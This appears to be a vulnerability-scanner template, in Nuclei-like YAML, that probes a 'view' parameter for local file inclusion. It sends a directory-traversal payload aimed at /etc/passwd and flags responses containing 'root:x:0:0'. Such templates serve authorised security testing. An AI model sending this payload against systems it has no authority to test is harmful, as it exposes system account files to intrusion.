id: lfi6-1306
name: 'Traversal in view'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via view'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      view:
        - '../../../../../../../../../../etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
